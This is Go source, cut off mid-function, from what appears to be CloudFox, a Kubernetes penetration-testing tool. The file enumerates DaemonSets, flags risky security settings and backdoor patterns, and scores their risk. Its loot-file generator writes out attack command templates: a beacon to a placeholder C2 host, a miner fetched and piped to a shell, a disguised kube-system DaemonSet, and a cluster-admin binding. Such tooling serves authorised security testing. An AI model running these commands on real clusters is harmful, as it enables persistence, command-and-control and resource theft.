package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	"k8s.io/client-go/kubernetes"
)

var DaemonSetsCmd = &cobra.Command{
	Use:     "daemonsets",
	Aliases: []string{"ds"},
	Short:   "List all cluster DaemonSets",
	Long: `
List all cluster DaemonSets (controller-level and template-level information):
  cloudfox kubernetes daemonsets`,
	Run: ListDaemonSets,
}

type DaemonSetsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t DaemonSetsOutput) TableFiles() []internal.TableFile { return t.Table }
func (t DaemonSetsOutput) LootFiles() []internal.LootFile   { return t.Loot }

type DaemonSetFinding struct {
	Namespace         string
	Name              string
	SecurityIssues    []string
	BackdoorPatterns  []string
	ReverseShells     []string
	CryptoMiners      []string
	DataExfiltration  []string
	ContainerEscape   []string
	NodeCompromise    []string
	DesiredNodes      int32
	CurrentNodes      int32
	ReadyNodes        int32
	ServiceAccount    string
	Containers        []DaemonSetContainer
	ImageRegistry     string
	ImageTags         []string
	HostPID           bool
	HostIPC           bool
	HostNetwork       bool
	Privileged        bool
	HostPaths         []string
	Volumes           []DaemonSetVolume
	RunAsUser         string
	Capabilities      []string
	NodeSelector      map[string]string
	Tolerations       []string
	Labels            map[string]string
	Annotations       map[string]string
	InitContainers    int
	ImagePullSecrets  []string
	Secrets           []string
	ConfigMaps        []string
	Affinity          string
	CloudProvider     string
	CloudRole         string
	Commands          []string
	Args              []string
	EnvVars           []string
	CreationTimestamp string
	RiskScore         int // Internal risk scoring for prioritization (0-100)
}

type DaemonSetContainer struct {
	Name           string
	Image          string
	Tag            string
	Registry       string
	Command        string
	Args           string
	Privileged     bool
	Capabilities   []string
	RunAsUser      string
	AllowPrivEsc   string
	ReadOnlyRootFS string
	ResourceLimits string
}

type DaemonSetVolume struct {
	Name       string
	VolumeType string
	Source     string
	MountPath  string
	ReadOnly   bool
}

func ListDaemonSets(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating daemonsets for %s", globals.ClusterName), globals.K8S_DAEMONSETS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Get all daemonsets using cache
	allDaemonSets, err := sdk.GetDaemonSets(ctx, clientset)
	if err != nil {
		shared.LogListError(&logger, "daemonsets", "", err, globals.K8S_DAEMONSETS_MODULE_NAME, true)
		return
	}

	// Table 1: DaemonSets Summary
	summaryHeaders := []string{
		"Namespace", "Name", "Labels", "Nodes (Desired/Current/Ready)",
		"Service Account", "Init Containers", "Image Pull Secrets",
		"Secrets", "ConfigMaps",
		"Security Context", "Suspicious Patterns", "Cloud IAM",
		"Affinity", "Tolerations",
	}

	// Table 2: DaemonSet-Containers Detail
	containerHeaders := []string{
		"Namespace", "DaemonSet", "Container", "Privileged", "Capabilities",
		"RunAsUser", "AllowPrivEsc", "ReadOnlyRootFS", "Resource Limits",
		"Image", "Tag", "Registry",
	}

	// Table 3: DaemonSet-Volumes Detail
	volumeHeaders := []string{
		"Namespace", "DaemonSet", "Volume Name", "Type", "Source Path/Name", "Container Mount Path", "Read Only",
	}

	var summaryRows [][]string
	var containerRows [][]string
	var volumeRows [][]string
	var findings []DaemonSetFinding

	for _, ds := range allDaemonSets {
		spec := ds.Spec.Template.Spec

		// Run comprehensive security analysis
		finding := analyzeDaemonSetSecurity(
			ctx,
			clientset,
			ds.Namespace,
			ds.Name,
			ds.Status.DesiredNumberScheduled,
			ds.Status.CurrentNumberScheduled,
			ds.Status.NumberReady,
			spec,
			spec.NodeSelector,
			ds.Spec.Template.Annotations,
		)

		findings = append(findings, finding)

		// Merge all suspicious patterns into one column
		suspiciousPatternsStr := strings.Join(finding.BackdoorPatterns, "; ")

		// Merge security context - only show pod-level settings that are enabled
		var secContextParts []string
		if finding.HostPID {
			secContextParts = append(secContextParts, "HostPID")
		}
		if finding.HostIPC {
			secContextParts = append(secContextParts, "HostIPC")
		}
		if finding.HostNetwork {
			secContextParts = append(secContextParts, "HostNetwork")
		}
		for _, hp := range finding.HostPaths {
			secContextParts = append(secContextParts, fmt.Sprintf("HostPath:%s", hp))
		}
		secContextStr := strings.Join(secContextParts, ", ")

		// Merge cloud provider and role
		var cloudIAMStr string
		if finding.CloudProvider != "" && finding.CloudRole != "" {
			cloudIAMStr = fmt.Sprintf("%s: %s", finding.CloudProvider, finding.CloudRole)
		}

		nodeStats := fmt.Sprintf("%d/%d/%d", finding.DesiredNodes, finding.CurrentNodes, finding.ReadyNodes)

		// Format labels for display
		var labelParts []string
		for k, v := range finding.Labels {
			labelParts = append(labelParts, fmt.Sprintf("%s=%s", k, v))
		}
		labelsStr := strings.Join(labelParts, ", ")

		// Format init containers count
		initContainersStr := ""
		if finding.InitContainers > 0 {
			initContainersStr = fmt.Sprintf("%d", finding.InitContainers)
		}

		// Format image pull secrets
		imagePullSecretsStr := strings.Join(finding.ImagePullSecrets, ", ")

		// Format secrets
		secretsStr := strings.Join(finding.Secrets, ", ")

		// Format configmaps
		configMapsStr := strings.Join(finding.ConfigMaps, ", ")

		// Format tolerations
		tolerationsStr := strings.Join(finding.Tolerations, ", ")

		// Table 1: Summary row
		summaryRow := []string{
			finding.Namespace,
			finding.Name,
			k8sinternal.NonEmpty(labelsStr),
			nodeStats,
			k8sinternal.NonEmpty(finding.ServiceAccount),
			k8sinternal.NonEmpty(initContainersStr),
			k8sinternal.NonEmpty(imagePullSecretsStr),
			k8sinternal.NonEmpty(secretsStr),
			k8sinternal.NonEmpty(configMapsStr),
			k8sinternal.NonEmpty(secContextStr),
			k8sinternal.NonEmpty(suspiciousPatternsStr),
			k8sinternal.NonEmpty(cloudIAMStr),
			k8sinternal.NonEmpty(finding.Affinity),
			k8sinternal.NonEmpty(tolerationsStr),
		}
		summaryRows = append(summaryRows, summaryRow)

		// Table 2: Container rows (one per container)
		for _, container := range finding.Containers {
			// Format capabilities
			capsStr := strings.Join(container.Capabilities, ", ")

			containerRow := []string{
				finding.Namespace,
				finding.Name,
				container.Name,
				fmt.Sprintf("%v", container.Privileged),
				k8sinternal.NonEmpty(capsStr),
				container.RunAsUser,
				container.AllowPrivEsc,
				container.ReadOnlyRootFS,
				k8sinternal.NonEmpty(container.ResourceLimits),
				container.Image,
				container.Tag,
				container.Registry,
			}
			containerRows = append(containerRows, containerRow)
		}

		// Table 3: Volume rows (one per volume)
		for _, volume := range finding.Volumes {
			volumeRow := []string{
				finding.Namespace,
				finding.Name,
				volume.Name,
				volume.VolumeType,
				volume.Source,
				volume.MountPath,
				fmt.Sprintf("%v", volume.ReadOnly),
			}
			volumeRows = append(volumeRows, volumeRow)
		}
	}

	// Generate comprehensive loot files
	lootFiles := generateDaemonSetLoot(findings, globals.KubeContext)

	// Create all three tables
	summaryTable := internal.TableFile{Name: "DaemonSets", Header: summaryHeaders, Body: summaryRows}
	containerTable := internal.TableFile{Name: "DaemonSet-Containers", Header: containerHeaders, Body: containerRows}
	volumeTable := internal.TableFile{Name: "DaemonSet-Volumes", Header: volumeHeaders, Body: volumeRows}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"DaemonSets",
		globals.ClusterName,
		"results",
		DaemonSetsOutput{Table: []internal.TableFile{summaryTable, containerTable, volumeTable}, Loot: lootFiles},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_DAEMONSETS_MODULE_NAME)
		return
	}

	if len(summaryRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d daemonsets found", len(summaryRows)), globals.K8S_DAEMONSETS_MODULE_NAME)
	} else {
		logger.InfoM("No daemonsets found, skipping output file creation", globals.K8S_DAEMONSETS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_DAEMONSETS_MODULE_NAME), globals.K8S_DAEMONSETS_MODULE_NAME)
}

// --- Security Analysis Functions ---

// detectNodeCompromise checks for DaemonSet-specific node compromise indicators
func detectNodeCompromise(hostPaths []string, capabilities []string, hostPID, hostIPC, hostNetwork, privileged bool) []string {
	var findings []string

	// DaemonSets with these combinations are designed for node compromise
	if privileged && hostPID {
		findings = append(findings, "Privileged + HostPID: Can access all node processes")
	}

	if privileged && len(hostPaths) > 0 {
		findings = append(findings, "Privileged + HostPaths: Can modify node filesystem")
	}

	if hostNetwork && hostPID {
		findings = append(findings, "HostNetwork + HostPID: Full node network visibility")
	}

	// Check for dangerous capabilities
	dangerousCaps := []string{"SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_OVERRIDE", "DAC_READ_SEARCH"}
	for _, cap := range capabilities {
		for _, danger := range dangerousCaps {
			if strings.Contains(cap, danger) {
				findings = append(findings, fmt.Sprintf("Dangerous capability: %s", danger))
			}
		}
	}

	// Check for specific hostPath targets
	for _, hp := range hostPaths {
		// Extract just the path part (before colon if mount point included)
		path := strings.Split(hp, ":")[0]

		if strings.Contains(path, "/var/lib/kubelet") {
			findings = append(findings, "HostPath: /var/lib/kubelet (access to all pod secrets)")
		}
		if strings.Contains(path, "/etc/kubernetes") {
			findings = append(findings, "HostPath: /etc/kubernetes (cluster configuration)")
		}
		if strings.Contains(path, "/var/log") {
			findings = append(findings, "HostPath: /var/log (node log access)")
		}
		if strings.Contains(path, "/proc") {
			findings = append(findings, "HostPath: /proc (process information)")
		}
		if strings.Contains(path, "/sys") {
			findings = append(findings, "HostPath: /sys (kernel parameters)")
		}
		if strings.Contains(path, "/dev") {
			findings = append(findings, "HostPath: /dev (device access)")
		}
	}

	return findings
}

func analyzeDaemonSetSecurity(
	ctx context.Context,
	clientset *kubernetes.Clientset,
	namespace string,
	name string,
	desiredNodes int32,
	currentNodes int32,
	readyNodes int32,
	podSpec v1.PodSpec,
	nodeSelector map[string]string,
	annotations map[string]string,
) DaemonSetFinding {

	finding := DaemonSetFinding{
		Namespace:      namespace,
		Name:           name,
		DesiredNodes:   desiredNodes,
		CurrentNodes:   currentNodes,
		ReadyNodes:     readyNodes,
		ServiceAccount: podSpec.ServiceAccountName,
		HostPID:        podSpec.HostPID,
		HostIPC:        podSpec.HostIPC,
		HostNetwork:    podSpec.HostNetwork,
		NodeSelector:   nodeSelector,
		Annotations:    annotations,
		InitContainers: len(podSpec.InitContainers),
	}

	// Image Pull Secrets
	for _, ps := range podSpec.ImagePullSecrets {
		finding.ImagePullSecrets = append(finding.ImagePullSecrets, ps.Name)
	}

	// Affinity
	if podSpec.Affinity != nil {
		finding.Affinity = k8sinternal.PrettyPrintAffinity(podSpec.Affinity)
	}

	// Tolerations - full details
	for _, t := range podSpec.Tolerations {
		tolStr := ""
		if t.Key != "" {
			tolStr = t.Key
			if t.Value != "" {
				tolStr += "=" + t.Value
			}
		} else {
			tolStr = "*"
		}
		if t.Effect != "" {
			tolStr += ":" + string(t.Effect)
		}
		tolStr += fmt.Sprintf(" (%s)", t.Operator)
		if t.TolerationSeconds != nil {
			tolStr += fmt.Sprintf(" [%ds]", *t.TolerationSeconds)
		}
		finding.Tolerations = append(finding.Tolerations, tolStr)
	}

	// Extract containers, commands, args, images
	var containers []DaemonSetContainer
	var allCommands []string
	var allArgs []string
	var allImages []string
	var allEnvVars []string
	var capabilities []string
	privileged := false
	runAsUser := "<NONE>"

	for _, c := range podSpec.Containers {
		// Parse image into components
		image := c.Image
		tag := "latest"
		registry := "docker.io"

		if strings.Contains(image, ":") {
			parts := strings.SplitN(image, ":", 2)
			image = parts[0]
			tag = parts[1]
		}
		if strings.Contains(image, "/") {
			parts := strings.Split(image, "/")
			if strings.Contains(parts[0], ".") || parts[0] == "localhost" {
				registry = parts[0]
			}
		}

		// Security context - per container
		containerPrivileged := false
		var containerCaps []string
		containerRunAsUser := "-"
		containerAllowPrivEsc := "true" // default is true if not specified
		containerReadOnlyRootFS := "false"
		containerResourceLimits := "-"
		if c.SecurityContext != nil {
			if c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
				containerPrivileged = true
				privileged = true
			}
			if c.SecurityContext.RunAsUser != nil {
				runAsUser = fmt.Sprintf("%d", *c.SecurityContext.RunAsUser)
				containerRunAsUser = runAsUser
			}
			if c.SecurityContext.AllowPrivilegeEscalation != nil {
				containerAllowPrivEsc = fmt.Sprintf("%v", *c.SecurityContext.AllowPrivilegeEscalation)
			}
			if c.SecurityContext.ReadOnlyRootFilesystem != nil {
				containerReadOnlyRootFS = fmt.Sprintf("%v", *c.SecurityContext.ReadOnlyRootFilesystem)
			}
			if c.SecurityContext.Capabilities != nil {
				for _, cap := range c.SecurityContext.Capabilities.Add {
					containerCaps = append(containerCaps, string(cap))
					capabilities = append(capabilities, string(cap))
				}
			}
		}

		// Build actual resource limits string
		if c.Resources.Limits != nil && len(c.Resources.Limits) > 0 {
			var limitParts []string
			if cpu, ok := c.Resources.Limits["cpu"]; ok {
				limitParts = append(limitParts, fmt.Sprintf("cpu:%s", cpu.String()))
			}
			if mem, ok := c.Resources.Limits["memory"]; ok {
				limitParts = append(limitParts, fmt.Sprintf("mem:%s", mem.String()))
			}
			if len(limitParts) > 0 {
				containerResourceLimits = strings.Join(limitParts, ", ")
			}
		}

		container := DaemonSetContainer{
			Name:           c.Name,
			Image:          c.Image,
			Tag:            tag,
			Registry:       registry,
			Command:        strings.Join(c.Command, " "),
			Args:           strings.Join(c.Args, " "),
			Privileged:     containerPrivileged,
			Capabilities:   containerCaps,
			RunAsUser:      containerRunAsUser,
			AllowPrivEsc:   containerAllowPrivEsc,
			ReadOnlyRootFS: containerReadOnlyRootFS,
			ResourceLimits: containerResourceLimits,
		}
		containers = append(containers, container)

		allImages = append(allImages, c.Image)
		allCommands = append(allCommands, c.Command...)
		allArgs = append(allArgs, c.Args...)

		// Collect environment variables
		for _, env := range c.Env {
			if env.Value != "" {
				allEnvVars = append(allEnvVars, fmt.Sprintf("%s=%s", env.Name, env.Value))
			}
		}
	}

	finding.Containers = containers
	finding.Commands = allCommands
	finding.Args = allArgs
	finding.Privileged = privileged
	finding.RunAsUser = runAsUser
	finding.Capabilities = capabilities
	finding.EnvVars = allEnvVars

	// Extract image registry and tags
	if len(allImages) > 0 {
		img := allImages[0]
		if strings.Contains(img, "/") {
			parts := strings.Split(img, "/")
			finding.ImageRegistry = parts[0]
		}

		for _, img := range allImages {
			if strings.Contains(img, ":") {
				tag := strings.Split(img, ":")[1]
				finding.ImageTags = append(finding.ImageTags, tag)
			}
		}
	}

	// Extract volumes and hostPaths
	var volumes []DaemonSetVolume
	var hostPaths []string
	for _, v := range podSpec.Volumes {
		volume := DaemonSetVolume{
			Name: v.Name,
		}

		// Determine volume type and source
		if v.HostPath != nil {
			volume.VolumeType = "HostPath"
			volume.Source = v.HostPath.Path
			hostPaths = append(hostPaths, v.HostPath.Path)
		} else if v.Secret != nil {
			volume.VolumeType = "Secret"
			volume.Source = v.Secret.SecretName
			finding.Secrets = append(finding.Secrets, v.Secret.SecretName)
		} else if v.ConfigMap != nil {
			volume.VolumeType = "ConfigMap"
			volume.Source = v.ConfigMap.Name
			finding.ConfigMaps = append(finding.ConfigMaps, v.ConfigMap.Name)
		} else if v.EmptyDir != nil {
			volume.VolumeType = "EmptyDir"
			volume.Source = "-"
		} else if v.PersistentVolumeClaim != nil {
			volume.VolumeType = "PVC"
			volume.Source = v.PersistentVolumeClaim.ClaimName
		} else if v.Projected != nil {
			volume.VolumeType = "Projected"
			volume.Source = "-"
		} else if v.DownwardAPI != nil {
			volume.VolumeType = "DownwardAPI"
			volume.Source = "-"
		} else {
			volume.VolumeType = "Other"
			volume.Source = "-"
		}

		// Find mount path and read-only status
		for _, container := range podSpec.Containers {
			for _, vm := range container.VolumeMounts {
				if vm.Name == v.Name {
					volume.MountPath = vm.MountPath
					volume.ReadOnly = vm.ReadOnly
					break
				}
			}
		}

		volumes = append(volumes, volume)
	}
	finding.Volumes = volumes
	finding.HostPaths = hostPaths

	// Cloud role detection
	if podSpec.ServiceAccountName != "" {
		roleResults := k8sinternal.DetectCloudRole(
			ctx,
			clientset,
			namespace,
			podSpec.ServiceAccountName,
			&podSpec,
			annotations,
		)
		if len(roleResults) > 0 {
			finding.CloudProvider = roleResults[0].Provider
			finding.CloudRole = roleResults[0].Role
		}
	}

	// Run security detection
	finding.ReverseShells = shared.DetectReverseShells(allCommands, allArgs)
	finding.CryptoMiners = shared.DetectCryptoMiners(allCommands, allArgs, allImages)
	finding.DataExfiltration = shared.DetectDataExfiltration(allCommands, allArgs)
	finding.ContainerEscape = shared.DetectContainerEscape(allCommands, allArgs, hostPaths)
	finding.NodeCompromise = detectNodeCompromise(hostPaths, capabilities, podSpec.HostPID, podSpec.HostIPC, podSpec.HostNetwork, privileged)

	// Combine all backdoor patterns
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ReverseShells...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.CryptoMiners...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.DataExfiltration...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ContainerEscape...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.NodeCompromise...)

	// Generate security issues
	finding.SecurityIssues = generateDaemonSetSecurityIssues(finding)

	// Calculate risk score for prioritization (internal use only)
	finding.RiskScore = calculateDaemonSetRiskScore(&finding)

	return finding
}

func generateDaemonSetLoot(findings []DaemonSetFinding, kubeContext string) []internal.LootFile {
	var lootContent []string
	var entrypointsContent []string

	// Sort findings by RiskScore descending for prioritization
	sort.Slice(findings, func(i, j int) bool {
		return findings[i].RiskScore > findings[j].RiskScore
	})

	// Collect suspicious findings (those with security issues or suspicious patterns)
	var suspicious []DaemonSetFinding
	for _, f := range findings {
		if len(f.SecurityIssues) > 0 || len(f.BackdoorPatterns) > 0 || len(f.CryptoMiners) > 0 ||
			len(f.ReverseShells) > 0 || len(f.DataExfiltration) > 0 || len(f.ContainerEscape) > 0 ||
			len(f.NodeCompromise) > 0 {
			suspicious = append(suspicious, f)
		}
	}

	// ========================================
	// DaemonSet-Commands.txt - Consolidated commands
	// ========================================
	lootContent = append(lootContent, "########################################")
	lootContent = append(lootContent, "##### DaemonSet Commands")
	lootContent = append(lootContent, "########################################")
	lootContent = append(lootContent, "")

	if kubeContext != "" {
		lootContent = append(lootContent, fmt.Sprintf("kubectl config use-context %s", kubeContext))
		lootContent = append(lootContent, "")
	}

	// === ENUMERATION ===
	lootContent = append(lootContent, "=== ENUMERATION ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# List all daemonsets with their node counts")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,DESIRED:.status.desiredNumberScheduled,CURRENT:.status.currentNumberScheduled,READY:.status.numberReady,NODE-SELECTOR:.spec.template.spec.nodeSelector")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find privileged daemonsets")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.containers[]?.securityContext?.privileged == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find daemonsets with hostPID/hostIPC/hostNetwork")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.hostPID == true or .spec.template.spec.hostIPC == true or .spec.template.spec.hostNetwork == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find daemonsets with hostPath volumes")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.volumes[]?.hostPath != null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find daemonsets with dangerous capabilities")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.containers[]?.securityContext?.capabilities?.add != null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")

	// === SUSPICIOUS DAEMONSETS ===
	if len(suspicious) > 0 {
		lootContent = append(lootContent, "=== SUSPICIOUS DAEMONSETS ===")
		lootContent = append(lootContent, "")

		for _, f := range suspicious {
			lootContent = append(lootContent, shared.FormatSuspiciousEntry(f.Namespace, f.Name, f.SecurityIssues)...)
			lootContent = append(lootContent, fmt.Sprintf("kubectl get daemonset %s -n %s -o yaml", f.Name, f.Namespace))
			lootContent = append(lootContent, fmt.Sprintf("kubectl describe daemonset %s -n %s", f.Name, f.Namespace))
			lootContent = append(lootContent, "")
		}
	}

	// === EXPLOITATION ===
	lootContent = append(lootContent, "=== EXPLOITATION ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# DaemonSets run on EVERY node - perfect for cluster-wide attacks")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Modify existing DaemonSet for persistence")
	lootContent = append(lootContent, "kubectl patch daemonset <name> -n <namespace> --type=json -p='[{\"op\": \"add\", \"path\": \"/spec/template/spec/containers/0/command\", \"value\": [\"/bin/sh\", \"-c\", \"curl http://c2/beacon; sleep 3600\"]}]'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Deploy crypto miner DaemonSet (runs on all nodes)")
	lootContent = append(lootContent, "kubectl create daemonset miner -n kube-system --image=alpine -- sh -c 'wget -O - http://POOL/xmrig.sh | sh'")
	lootContent = append(lootContent, "")

	// === PERSISTENCE ===
	lootContent = append(lootContent, "=== PERSISTENCE ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Hide in kube-system namespace with legitimate-sounding names")
	lootContent = append(lootContent, "kubectl create daemonset kube-proxy-monitor -n kube-system --image=alpine -- sh -c 'curl http://c2/beacon'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Create ServiceAccount with cluster-admin for DaemonSet")
	lootContent = append(lootContent, "kubectl create sa persistence-sa -n kube-system")
	lootContent = append(lootContent, "kubectl create clusterrolebinding persistence-admin --clusterrole=cluster-admin --serviceaccount=kube-system:persistence-sa")
	lootContent = append(lootContent, "")

	// ========================================
	// DaemonSet-Entrypoints.txt - Container startup commands
	// ========================================
	entrypointsContent = append(entrypointsContent, "########################################")
	entrypointsContent = append(entrypointsContent, "##### DaemonSet Container Entrypoints")
	entrypointsContent = append(entrypointsContent, "########################################")
	entrypointsContent = append(entrypointsContent, "# Only containers with commands or args are shown")
	entrypointsContent = append(entrypointsContent, "")

	// Use already sorted findings (sorted by RiskScore descending)
	for _, f := range findings {
		var containerEntries []string
		for _, c := range f.Containers {
			// Only include containers with non-empty command or args
			if c.Command != "" || c.Args != "" {
				containerEntries = append(containerEntries, fmt.Sprintf("Container: %s", c.Name))
				containerEntries = append(containerEntries, fmt.Sprintf("  Image: %s", c.Image))
				if c.Command != "" {
					containerEntries = append(containerEntries, fmt.Sprintf("  Command: %s", c.Command))
				}
				if c.Args != "" {
					containerEntries = append(containerEntries, fmt.Sprintf("  Args: %s", c.Args))
				}
				containerEntries = append(containerEntries, "")
			}
		}

		// Only add workload section if it has containers with commands/args
		if len(containerEntries) > 0 {
			entrypointsContent = append(entrypointsContent, fmt.Sprintf("=== %s/%s ===", f.Namespace, f.Name))
			entrypointsContent = append(entrypointsContent, "")
			entrypointsContent = append(entrypointsContent, containerEntries...)
		}
	}

	return []internal.LootFile{
		{Name: "DaemonSet-Commands", Contents: strings.Join(lootContent, "\n")},
		{Name: "DaemonSet-Entrypoints", Contents: strings.Join(entrypointsContent, "\n")},
	}
}

// generateDaemonSetSecurityIssues creates a list of specific security issues
func generateDaemonSetSecurityIssues(finding DaemonSetFinding) []string {
	var issues []string

	// Malicious activity
	if len(finding.ReverseShells) > 0 {
		issues = append(issues, fmt.Sprintf("Reverse shell patterns detected: %s", strings.Join(finding.ReverseShells, ", ")))
	}
	if len(finding.CryptoMiners) > 0 {
		issues = append(issues, fmt.Sprintf("Crypto mining patterns detected: %s - resource abuse on all nodes", strings.Join(finding.CryptoMiners, ", ")))
	}
	if len(finding.DataExfiltration) > 0 {
		issues = append(issues, fmt.Sprintf("Data exfiltration patterns: %s", strings.Join(finding.DataExfiltration, ", ")))
	}
	if len(finding.ContainerEscape) > 0 {
		issues = append(issues, fmt.Sprintf("Container escape techniques detected: %s", strings.Join(finding.ContainerEscape, ", ")))
	}
	if len(finding.NodeCompromise) > 0 {
		issues = append(issues, fmt.Sprintf("Node compromise patterns: %s - all %d nodes at risk", strings.Join(finding.NodeCompromise, ", "), finding.DesiredNodes))
	}

	// Privileged access
	if finding.Privileged {
		issues = append(issues, fmt.Sprintf("Privileged DaemonSet running on %d nodes - kernel access on all nodes", finding.DesiredNodes))
	}
	if finding.HostPID {
		issues = append(issues, "hostPID enabled - can view/kill all node processes")
	}
	if finding.HostIPC {
		issues = append(issues, "hostIPC enabled - can access inter-process communication on nodes")
	}
	if finding.HostNetwork {
		issues = append(issues, "hostNetwork enabled - can sniff network traffic on all nodes")
	}

	// Dangerous hostPath mounts
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			issues = append(issues, fmt.Sprintf("Container runtime socket mounted (%s) - cluster admin access", hp))
		} else if hp == "/" || hp == "/:" {
			issues = append(issues, "Root filesystem mounted - complete node compromise")
		} else if strings.Contains(hp, "/var/run") {
			issues = append(issues, fmt.Sprintf("Sensitive path mounted: %s", hp))
		} else {
			issues = append(issues, fmt.Sprintf("HostPath volume: %s", hp))
		}
	}

	// Dangerous capabilities
	dangerousCaps := map[string]string{
		"SYS_ADMIN":       "full system administration",
		"SYS_MODULE":      "kernel module loading",
		"SYS_RAWIO":       "direct hardware access",
		"SYS_PTRACE":      "process debugging/injection",
		"DAC_READ_SEARCH": "bypass file read permissions",
		"NET_ADMIN":       "network configuration control",
		"SYS_BOOT":        "system reboot capability",
		"SYS_TIME":        "system time manipulation",
	}

	for _, cap := range finding.Capabilities {
		for dangerousCap, desc := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				issues = append(issues, fmt.Sprintf("Dangerous capability %s - enables %s", dangerousCap, desc))
			}
		}
	}

	// RunAsUser check
	if finding.RunAsUser == "0" || finding.RunAsUser == "" {
		issues = append(issues, "Running as root (UID 0)")
	}

	// Wide deployment
	if finding.DesiredNodes > 50 {
		issues = append(issues, fmt.Sprintf("DaemonSet on %d nodes - large attack surface", finding.DesiredNodes))
	}

	// Cloud IAM role
	if finding.CloudRole != "" {
		if strings.Contains(strings.ToLower(finding.CloudRole), "admin") {
			issues = append(issues, fmt.Sprintf("Cloud admin role assigned: %s", finding.CloudRole))
		} else {
			issues = append(issues, fmt.Sprintf("Cloud IAM role: %s", finding.CloudRole))
		}
	}

	// Service account
	if finding.ServiceAccount == "default" {
		issues = append(issues, "Using default service account")
	}

	return issues
}

// calculateDaemonSetRiskScore calculates comprehensive risk score (internal use only for prioritization)
// Returns a score from 0-100 based on security factors, with higher scores indicating higher risk.
// DaemonSets are particularly dangerous because they run on ALL nodes in the cluster.
func calculateDaemonSetRiskScore(finding *DaemonSetFinding) int {
	score := 0

	// CRITICAL malicious patterns - highest priority
	if len(finding.ReverseShells) > 0 {
		score += 95 // Reverse shell = active backdoor on all nodes
	}
	if len(finding.CryptoMiners) > 0 {
		score += 90 // Crypto mining on all nodes = massive resource abuse
	}
	if len(finding.DataExfiltration) > 0 {
		score += 85 // Data exfiltration patterns on all nodes
	}
	if len(finding.ContainerEscape) > 0 {
		score += 80 // Container escape techniques on all nodes
	}
	if len(finding.NodeCompromise) > 0 {
		score += 75 // Node compromise patterns affect all nodes
	}

	// Privileged access - extremely dangerous on DaemonSets
	if finding.Privileged {
		score += 70
		// Privileged + host namespaces on DaemonSet = cluster-wide compromise
		if finding.HostPID || finding.HostNetwork || finding.HostIPC {
			return 100 // Maximum risk - guaranteed cluster-wide escape
		}
	}

	// Host namespace access - dangerous on all nodes
	if finding.HostPID {
		score += 60 // Can view/kill all processes on every node
	}
	if finding.HostNetwork {
		score += 55 // Can sniff network traffic on every node
	}
	if finding.HostIPC {
		score += 45 // Can access IPC on every node
	}

	// Sensitive host paths - cluster-wide exposure
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			score += 90 // Container runtime socket on all nodes = cluster admin
		} else if strings.Contains(hp, "/var/lib/kubelet") {
			score += 85 // Access to all pod secrets on all nodes
		} else if strings.Contains(hp, "/etc/kubernetes") {
			score += 80 // Cluster configuration on all nodes
		} else if hp == "/" || hp == "/:" {
			score += 75 // Root filesystem on all nodes
		} else if strings.Contains(hp, "/var/run") {
			score += 50 // Runtime directory on all nodes
		} else if strings.Contains(hp, "/proc") || strings.Contains(hp, "/sys") {
			score += 40 // Kernel interfaces on all nodes
		} else if strings.Contains(hp, "/dev") {
			score += 45 // Device access on all nodes
		} else {
			score += 25 // Any other hostPath on all nodes
		}
	}

